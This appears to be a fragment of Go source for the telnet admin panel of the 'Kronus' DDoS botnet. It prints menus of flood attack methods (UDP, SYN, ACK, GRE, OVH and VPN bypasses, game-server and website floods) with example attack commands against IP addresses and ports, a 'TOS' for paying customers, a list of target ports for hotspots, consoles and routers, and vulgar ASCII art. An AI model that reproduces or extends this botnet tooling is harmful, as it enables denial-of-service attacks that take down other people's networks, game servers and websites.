		    this.conn.Write([]byte("\033[1;49;35m User:\033[1;49;32m " + username + " \033[1;49;35mMessage: \033[1;49;32mWelcome to Kronus! \033[1;49;35m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                            \033[1;49;32m ╦╔═ ╦═╗ ╔═╗ ╦═╗ ╦ ╦ ╔═╗                     \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                            \033[1;49;32m ╠╩╗ ╟╦╝ ║ ║ ║ ║ ║ ║ ╚═╗                     \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                           \033[1;49;32m  ╩ ╩ ╩╚═ ╚═╝ ╩ ╩ ╚═╝ ╚═╝ \033[1;49;35m                   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                   ╔═════════════════════════════════════╗          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                   ║     \033[1;49;32mWELCOME TO KRONUS BOTNET        \033[1;49;35m║          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                   ╚═════════════════════════════════════╝          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ╔════════════════════════════════════════════════════╗  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ║           \033[0;35mTYPE [HELP] FOR MORE INFORMATION           \033[1;49;35m║  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m            ╚════════════════════════════════════════════════════╝  \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                         ╔═════════════════════════╗                \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                         ║ \033[1;49;32mCONNECTION ESTABILISHED \033[1;49;35m║                \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                         ╚═════════════════════════╝                \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m       ╔════════════════════════════════════════════════════════════════╗   \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m       ║\033[1;49;32m═════════════════⮞ https://discord.gg/QsfZCgESbC ⮜═════════════════\033[1;49;35m║   \033[0m \r\n"))  
			this.conn.Write([]byte("\033[1;49;35m       ╚════════════════════════════════════════════════════════════════╝   \033[0m \r\n"))
			this.conn.Write([]byte("\r\n"))                     
            this.conn.Write([]byte("\r\n"))
    continue
        }   //info
        /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		if err != nil || cmd == "tos" || cmd == "TOS" {
            this.conn.Write([]byte("\033[1;49;32m                        ╔═══════════════════════════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35m                      ❌-T O S                                    \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO Sharing Your Login Information!                                \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO Leaking Net information                                        \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO fucking Sharing Your Login Im fucking watching you👀           \033[1;49;32m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO Spamming API Attacks                                           \033[1;49;32m║\033[0m \r\n"))
    		this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO Spamming Attacks On Antibotnet IP addresses like a Path        \033[1;49;32m║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO Complaining publicly if have any problems just contact me      \033[1;49;32m║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mNO Spamming along af attacks on random ip addresses               \033[1;49;32m║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                        ║ \033[1;49;35mBREAK THESE RULES THEN YOUR PLAN WILL GET SUSPENDED               \033[1;49;32m║\033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                        ╚═══════════════════════════════════════════════════════════════════╝\r\n"))
			continue
        }
        
		
		
	   /*--------------------------------------------------------------------------------------------------------------------------------------------*/
		if err != nil || cmd == "PORTS" || cmd == "ports" {
          this.conn.Write([]byte("\033[1;49;35m ╔════════════════════════════════════════════════════════════════════╗\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// HOTSPOT PORTS:                    VERIZON 4G LTE:                \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// UDP - 1900                        UDP - 53, 123, 500, 4500, 52248\033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// TCP - 2859, 5000                  TCP - 53                       \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║                                                                    \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// AT&T Wi-Fi HOTSPOTS                ATTACK PORTS:                 \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// UDP - 137, 138, 139, 445, 8053     699 Good For Hotspots         \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// TCP - 1434, 8053, 8083, 8084       5060 Router Reset Port        \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// TELNET - 23                                                      \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// GENERAL PORTS:                                                   \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// HOME: 80, 53, 22, 8080                                           \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// XBOX: 3074                                                       \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// PS4: 9307                                                        \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// PS3:                                                             \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║//-TCP:3478, 3479, 3480, 5223                                       \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║//-UDP:3478, 3479                                                   \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// HOTSPOT: 9286                                                    \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// VPN: 7777                              OwO                       \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// NFO: 1192  TIP: ZOOM OUT TO SEE BETTER                           \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// OVH: 992                                                         \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ║// HTTP: 80, 8080,443                                               \033[1;49;35m║\033[0m \r\n"))
          this.conn.Write([]byte("\033[1;49;35m ╚════════════════════════════════════════════════════════════════════╝\033[0m \r\n"))
          continue
        }
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
			if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            botCount = clientList.Count()
            this.conn.Write([]byte("\033[1;49;35m                  ╔═══════════════════════════════════════════════╗                 \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                  ║  ⮞TOOLS TOYS BANNERS BOTS STATS TOS           ║                 \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                  ║  ⮞BOOTHELP ANIME                              ║                 \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                  ║  ⮞BANNERS2 NSFW TUT ACCOUNT CHAT              ║                 \033[0m \r\n"))                                                  
  		    this.conn.Write([]byte("\033[1;49;35m                  ║              \033[1;49;32m┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐               \033[1;49;35m║                 \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║              \033[1;49;32m├┴┐ ├┰┘ │ │ │││ │ │ └─┐               \033[1;49;35m║                 \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║              \033[1;49;32m┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘               \033[1;49;35m║                 \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                  ║                                               ║                 \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞ATTACK/PORTS                                 ║                 \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                  ╚═══════════════════════════════════════════════╝                 \033[0m \r\n"))   
            this.conn.Write([]byte("\033[1;49;35m                                       .---.                                        \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐             |---|            ┌┐ ┌─┐┌┬┐┌┐┌┌─┐┌┬┐          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        ├┴┐ ├┰┘ │ │ │││ │ │ └─┐             |---|            ├┴┐│ │ │ │││├┤  │           \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘             |---|            └─┘└─┘ ┴ ┘└┘└─┘ ┴           \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m  ╔═════════════════════════════╗  .---^ - ^---.   ╔════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m  ║\033[1;49;32mhttps://discord.gg/QsfZCgESbC\033[1;49;35m║  :___________:   ║  \033[1;49;32mYT: PROJECT KRONUS         \033[1;49;35m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m  ║     \033[1;49;32m                        \033[1;49;35m║     |  |//|      ║                            ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m  ╚═════════════════════════════╝     |  |//|      ╚════════════════════════════╝   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                      |  |//|                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                      |  |//|                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                      |  |//|                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                      |  |//|                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m      \033[1;49;32mTIP: Scretch out screen\033[1;49;35m         |  |.-|                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m        \033[1;49;32mOr go in full screen\033[1;49;35m          |.-'**|                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                       \\***/                                       \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                        \\*/                                        \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                         V                                         \033[0m \r\n"))
            this.conn.Write([]byte("\033[0m\r\n"))                  
            continue
        }                                                                                                                                                                                                                                                                                                           

/*--------------------------------------------------------------------------------------------------------------------------------------------*/       
	   		if err != nil || cmd == "REG" || cmd == "regular" || cmd == "reg" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;32m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                  ║   .....R    E     G     U     L     A     R.....     ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╔═════════════════════════╗  ╔═════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/home      ⮞/kpac     \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/stdhex    ⮞/killall  \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/udphex    ⮞/stomp    \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))                           
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/udp       ⮞/ice      \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/hex       ⮞/vse      \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/std       ⮞/dns      \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/udpplain  ⮞/randhex  \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/greeth    ⮞/raid     \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/syn                  \033[1;49;35m ║  ║                         ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/frag                 \033[1;49;35m ╚══╝                         ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/ack                  \033[1;49;35m                              ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/greip                \033[1;49;35m                              ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/xmas                 \033[1;49;35m                              ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/tcpall               \033[1;49;35m                              ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
	        this.conn.Write([]byte("\033[0m\r\n"))                  
            continue 
        }
		if err != nil || cmd == "ATTACK" || cmd == "attack" || cmd == ".attack" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
		    this.conn.Write([]byte("\033[1;49;32m                               ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                               ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                          \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                               ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                          \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                            ╔═══════════════════════╗                      \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                            ║ KRONUS ATTACK METHODS ║                      \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m                            ╚═══════════════════════╝                      \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m               ╔════════════════════════════════════════════════════╗      \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m               ║⮞REGULAR   ⮞GAME   ⮞WEB   ⮞BYPASS   ⮞CUSTOM  ⮞API   ║     \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;35m               ╚════════════════════════════════════════════════════╝      \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;32m                                                                           \033[0m \r\n"))
		    this.conn.Write([]byte("\033[1;49;32m    		                                                                \033[0m \r\n"))
			this.conn.Write([]byte("\033[0m\r\n"))                  
            continue 
        }
		
		
		if err != nil || cmd == "BYPASS" || cmd == "bypass" || cmd == "bypass" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;35m                                     ┬┌─ ┌─┐ ┌─┐ ┌┐┌ ┬ ┬ ┌─┐                    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                     ├┴┐ ├┰┘ │ │ │││ │ │ └─┐                    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                                     ┴ ┴ ┴┕─ └─┘ ┘└┘ └─┘ └─┘                    \033[0m \r\n"))			
			this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ..B   Y   P  A   S   S   M   E   T   H   O   D   S.. ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/ovhpump   \033[1;49;32mEX: /ovhpump 1.1.1.1 105 dport=443\033[1;49;35m       ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/ovh2      \033[1;49;32mEX: /ovh2 1.1.1.1 105 dport=443\033[1;49;35m          ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/ovh       \033[1;49;32mEX: /ovh 1.1.1.1 105 dport=443\033[1;49;35m           ║ \033[0m \r\n"))                           
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/vpn       \033[1;49;32mEX: /vpn 1.1.1.1 105 dport=443\033[1;49;35m           ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/hydra-lag \033[1;49;32mEX: /hydra-lag 1.1.1.1 105 dport=443\033[1;49;35m     ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/vpn-stomp \033[1;49;32mEX: /vpn-stomp 1.1.1.1 105 dport=443\033[1;49;35m     ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/vpn-crush \033[1;49;32mEX: /vpn-crush 1.1.1.1 105 dport=443\033[1;49;35m     ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/nfodown   \033[1;49;32mEX: /nfodown 1.1.1.1 105 dport=443\033[1;49;35m       ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/vpnsyn    \033[1;49;32mEX: /vpnsyn 1.1.1.1 105 dport=443\033[1;49;35m        ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
	        this.conn.Write([]byte("\033[0m\r\n"))                  
            continue 
        }
	    	  	 if err != nil || cmd == "TOYS" || cmd == "toys" || cmd == "TOY" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;32m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                  ║           ..T       O        Y         S..           ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║     \033[1;49;32mTOY 1. MILK                                      \033[1;49;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))                           
            this.conn.Write([]byte("\033[1;49;35m                  ║     \033[1;49;32mTOY 2. ROOTED                                    \033[1;49;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║     \033[1;49;32mTOY 3. MEERKAT                                   \033[1;49;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║     \033[1;49;32mTOY 4.                                           \033[1;49;35m║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
	        this.conn.Write([]byte("\033[0m\r\n"))                  
            continue 
        }
			  if err != nil || cmd == "WEB" || cmd == "web" || cmd == "WEBSITE" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;32m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                  ║    .....W    E     B    S     I     T     E.....     ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/web-crush /web-crush ip time dport=port            \033[1;49;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/web-rape  /web-rape ip time dport=port             \033[1;49;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/web-slap  /web-slap ip time dport=port             \033[1;49;35m║ \033[0m \r\n"))                           
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞\033[1;49;32m/cf-backend                                         \033[1;49;35m║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ EX: /web-crush 85.10.218.146 120 dport=443           ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ Website: https://telnet-online.net/                  ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
	        this.conn.Write([]byte("\033[0m\r\n"))                  
            continue 
        }
        	 if err != nil || cmd == "GAME" || cmd == "game" || cmd == "games" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;49;32m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;32m                  ║     .....G       A         M         E.....          ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;32m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/fn  /bo2  /coldwar  /five-m                        ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/r6  /bo3  /fn-creative                             ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/2k  /bo4  /2k-park                                 ║ \033[0m \r\n"))                           
            this.conn.Write([]byte("\033[1;49;35m                  ║ ⮞/cod /bo5  /minecraft                               ║ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                  ╔══════════════════════════════════════════════════════╗ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ EX: /fn 3.250.192.0 120 dport=9034                   ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║                                                      ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ║ tip:this is how it would somewhat look...            ║ \033[0m \r\n"))
			this.conn.Write([]byte("\033[1;49;35m                  ╚══════════════════════════════════════════════════════╝ \033[0m \r\n"))
	        this.conn.Write([]byte("\033[0m\r\n"))                  
            continue 
        }
	   /*--------------------------------------------------------------------------------------------------------------------------------------------*/

		if err != nil || cmd == "PUSSY" || cmd == "pussy" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m         ¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m        ¶¶´´´´¶¶¶¶¶´´¶¶¶¶´¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m        ¶´´´´´´´´´´¶¶¶¶´¶¶´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m        ¶´´´´´´´´´´¶´¶¶¶¶¶¶´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m       ¶´´´´´´´´´´¶¶¶¶¶´´´¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m      ¶´´´´´´´´´´´´´´´´¶¶¶¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m     ¶´´´´´´´´´´´´´´´´´´´¶¶¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m   ¶¶¶´´´´´¶´´´´´´´´´´´´´´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m     ¶´´´´¶¶´´´´´´´´´´´´´´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m     ¶¶´´´´´´´´´´´´´´´´¶¶´´´´¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m    ¶¶¶´´´´´´´´´¶¶¶´´´´¶¶´´´¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m       ¶¶´´´´´´´´´´´´´´´´´´¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m         ¶¶¶´´´´´´´´´´´´´¶¶¶\033[0m\r\n"))
			this.conn.Write([]byte("\033[00;1;95m           ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0m\r\n"))
			continue
		}
		
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/   
		   if err != nil || cmd == "BANG" || cmd == "bang" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
    
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m         | == /        \r\n"))
            this.conn.Write([]byte("\033[34m          |  |         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m          |  |         \r\n"))
            this.conn.Write([]byte("\033[34m          |  /         \r\n"))
            this.conn.Write([]byte("\033[1;49;35m           |/          \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[1;49;35m                       \r\n"))
            this.conn.Write([]byte("\033[34m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
